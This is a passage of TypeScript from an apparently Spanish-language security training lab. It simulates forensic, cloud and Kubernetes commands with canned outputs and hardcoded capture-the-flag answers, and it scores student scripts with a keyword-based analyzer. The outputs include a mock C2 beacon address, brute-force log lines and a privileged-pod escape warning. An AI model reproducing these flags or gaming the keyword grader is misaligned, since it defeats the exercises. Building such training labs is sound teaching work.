    if (cmd.includes('Failed') || cmd.includes('Accepted') || cmd.includes('auth')) {
      return makeResult(
        [
          '2026-11-03T02:14:01Z srv-prod-01 sshd[4012]: Failed password for invalid user admin from 203.0.113.42 port 51204 ssh2',
          '2026-11-03T02:14:03Z srv-prod-01 sshd[4015]: Failed password for root from 203.0.113.42 port 51208 ssh2',
          '2026-11-03T02:14:09Z srv-prod-01 sshd[4024]: Accepted publickey for deploy from 203.0.113.42 port 51240 ssh2',
          '[+] IP de origen correlacionada en SIEM: 203.0.113.42 (RFC 5737 Test-Net)',
          'FLAG{SIEM_SIGMA_THREAT_HUNTED_203_0_113_42}',
        ].join('\n'),
        0,
        {
          completedStepIndex: 2,
          capturedFlag: 'FLAG{SIEM_SIGMA_THREAT_HUNTED_203_0_113_42}',
        }
      );
    }
    return makeResult('grep: especifica el patrón y el archivo (ej. grep "Failed" auth.log)', 1);
  }

  if (bin === 'sha256sum') {
    return makeResult(
      [
        'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  artefacto_sospechoso.bin',
        '[+] Hash criptográfico SHA-256 verificado para cadena de custodia.',
        'FLAG{CRYPTO_AES_GCM_ARGON2ID_VERIFIED}',
      ].join('\n'),
      0,
      {
        completedStepIndex: 2,
        capturedFlag: 'FLAG{CRYPTO_AES_GCM_ARGON2ID_VERIFIED}',
      }
    );
  }

  if (bin === 'strings') {
    return makeResult(
      [
        '/lib64/ld-linux-x86-64.so.2',
        'C2_CALLBACK_URI=https://203.0.113.42:4444/beacon',
        'MUTEX_ID=AEGIS_DFIR_ARTIFACT_4120',
        'FLAG{DFIR_VOLATILITY_MEMORY_FORENSICS_DONE}',
      ].join('\n'),
      0,
      {
        completedStepIndex: 2,
        capturedFlag: 'FLAG{DFIR_VOLATILITY_MEMORY_FORENSICS_DONE}',
      }
    );
  }

  // 12. Cloud & Kubernetes Commands (Strictly isolated to 'cloud-cluster' node!)
  if (bin === 'aws' || bin === 'kubectl') {
    if (node.id !== 'cloud-cluster') {
      return makeResult(`bash: ${bin}: command not found`, 127, {
        detectedErrorHint: `La utilidad '${bin}' solo está instalada en el nodo de control Cloud/Kubernetes (k8s-sec-control).`,
      });
    }

    if (bin === 'aws') {
      if (cmd.includes('iam') && cmd.includes('get-policy-version')) {
        return makeResult(
          JSON.stringify(
            {
              PolicyVersion: {
                Document: {
                  Version: '2012-10-17',
                  Statement: [
                    {
                      Effect: 'Allow',
                      Action: ['iam:PassRole', 'ec2:RunInstances'],
                      Resource: '*',
                    },
                  ],
                },
              },
            },
            null,
            2
          ),
          0,
          { completedStepIndex: 1 }
        );
      }
      return makeResult('usage: aws iam get-policy-version', 1);
    }

    if (bin === 'kubectl') {
      if (parts[1] === 'version') {
        return makeResult('Client Version: v1.30.2\nServer Version: v1.30.2', 0);
      }
      if (parts[1] === 'get' && parts[2]?.startsWith('pod')) {
        return makeResult(
          [
            'NAME                            READY   STATUS    RESTARTS   SECURITY_CONTEXT',
            'api-gateway-6b8f9c-77k1p        1/1     Running   0          runAsNonRoot=true,privileged=false',
            'payment-worker-7d9c8b-x92lq     1/1     Running   0          privileged=true,hostPID=true [RIESGO CRÍTICO: ESCAPE A NODO]',
            'FLAG{CLOUD_IAM_K8S_PRIVILEGED_POD_MITIGATED}',
          ].join('\n'),
          0,
          {
            completedStepIndex: 2,
            capturedFlag: 'FLAG{CLOUD_IAM_K8S_PRIVILEGED_POD_MITIGATED}',
          }
        );
      }
      return makeResult('usage: kubectl get pods', 1);
    }
  }

  // Unknown command: standard POSIX exit code 127
  return makeResult(`bash: ${bin}: command not found`, 127, {
    detectedErrorHint: `El comando '${bin}' no existe en este nodo. Escribe 'help' para ver las utilidades instaladas.`,
  });
}

/**
 * Static AST/Pattern & Security Analyzer for Python 3 and Bash Scripts.
 * - Rejects comment-only or empty scripts (score: 0, passed: false)
 * - Detects unbalanced syntax and missing block colons
 * - Penalizes insecure coding practices (shell=True, bare except: pass, eval)
 */
export function runSecurityScriptSandbox(
  language: 'python' | 'bash',
  code: string
): {
  passed: boolean;
  success: boolean;
  score: number;
  securityScore: number;
  output: string;
  feedback: string;
} {
  const rawLines = code.split('\n');
  const executableLines = rawLines
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && !l.startsWith('#'));

  if (executableLines.length === 0) {
    return {
      passed: false,
      success: false,
      score: 0,
      securityScore: 0,
      output: '[!] Error de validación estática: No hay sentencias ejecutables.',
      feedback:
        'El script solo contiene comentarios o líneas en blanco (0/100). Escribe instrucciones reales de Python o Bash.',
    };
  }

  // Check balanced parentheses and quotes
  const openParens = (code.match(/\(/g) || []).length;
  const closeParens = (code.match(/\)/g) || []).length;
  if (openParens !== closeParens) {
    return {
      passed: false,
      success: false,
      score: 15,
      securityScore: 15,
      output: 'SyntaxError: unmatched parentheses in script',
      feedback:
        'Error de sintaxis detectado: los paréntesis `(` y `)` no están balanceados en tu código.',
    };
  }

  const issues: string[] = [];
  const strengths: string[] = [];
  let score = 60;

  if (language === 'python') {
    // Check Python block headers missing ':'
    for (const line of executableLines) {
      if (
        /^(def|for|while|if|elif|else|try|except|with)\b/.test(line) &&
        !line.endsWith(':') &&
        !line.includes(':')
      ) {
        return {
          passed: false,
          success: false,
          score: 20,
          securityScore: 20,
          output: `SyntaxError: expected ':' at line: ${line}`,
          feedback: `Error de sintaxis en Python: la sentencia de bloque \`${line}\` debe terminar con dos puntos (\`:\`).`,
        };
      }
    }

    // Check try without except/finally
    const hasTry = executableLines.some((l) => /^try\s*:/.test(l));
    const hasExceptOrFinally = executableLines.some((l) => /^(except|finally)\b/.test(l));
    if (hasTry && !hasExceptOrFinally) {
      return {
        passed: false,
        success: false,
        score: 20,
        securityScore: 20,
        output: 'SyntaxError: expected except or finally block after try',
        feedback: 'Error de sintaxis en Python: abriste un bloque `try:` sin su correspondiente `except` o `finally`.',
      };
    }

    if (/shell\s*=\s*True/.test(code)) {
      score -= 35;
      issues.push(
        'Riesgo crítico de inyección de comandos: evita `shell=True` en `subprocess`; pasa una lista de argumentos.'
      );
    }
    if (/except\s*:\s*pass/.test(code)) {
      score -= 30;
      issues.push(
        'Mala práctica detectada (`except: pass`): silenciar todas las excepciones oculta fallos de red y seguridad.'
      );
    }
    if (/\beval\s*\(/.test(code)) {
      score -= 35;
      issues.push('Uso inseguro de `eval()`: permite ejecución arbitraria de código.');
    }

    if (/import\s+(socket|hashlib|re|subprocess|json|urllib|sys)/.test(code)) {
      score += 15;
      strengths.push('Uso de módulos estándar de auditoría.');
    }
    if (/with\s+open|\bdef\s+\w+|\bfor\s+\w+\s+in\b|\btry\s*:/.test(code)) {
      score += 15;
      strengths.push('Estructura modular o manejo de errores bien definido.');
    }
    if (/print\s*\(|settimeout|sys\.exit/.test(code)) {
      score += 10;
      strengths.push('Control de tiempo de espera o telemetría explícita.');
    }
  } else {
    // Bash static checks
    const hasForOrWhile = executableLines.some((l) => /^(for|while)\b/.test(l));
    const hasDone = executableLines.some((l) => /\bdone\b/.test(l));
    if (hasForOrWhile && !hasDone) {
      return {
        passed: false,
        success: false,
        score: 20,
        securityScore: 20,
        output: "bash: syntax error: unexpected end of file (missing 'done')",
        feedback: 'Error de sintaxis en Bash: abriste un bucle `for/while` pero falta cerrar con `done`.',
      };
    }

    if (/set\s+-[euo]/.test(code)) {
      score += 15;
      strengths.push('Modo estricto de Bash (`set -e`/`-u`) activado.');
    }
    if (/\b(for|if|grep|awk|cut|find|curl)\b/.test(code)) {
      score += 20;
      strengths.push('Uso de tuberías o utilidades POSIX de automatización.');
    }
  }

  const finalScore = Math.max(0, Math.min(100, score));
  const passed = finalScore >= 70 && issues.length === 0;

  return {
    passed,
    success: passed,
    score: finalScore,
    securityScore: finalScore,
    output: passed
      ? `[Revisión Estática Superada · ${finalScore}/100]\nSentencias verificadas: ${executableLines.length}\nHallazgos positivos: ${strengths.join(' ') || 'Sintaxis válida.'}\nFLAG{PYTHON_BASH_AUTOMATION_SCRIPT_OK}`
      : `[Revisión Estática con Alertas · ${finalScore}/100]\nProblemas detectados:\n- ${issues.join('\n- ') || 'Falta lógica funcional completa.'}`,
    feedback: passed
      ? `Análisis estático de código superado (${finalScore}/100). Sin patrones inseguros.`
      : `Revisa tu código (${finalScore}/100): ${issues.join(' ') || 'Agrega estructuras funcionales completas.'}`,
  };
}
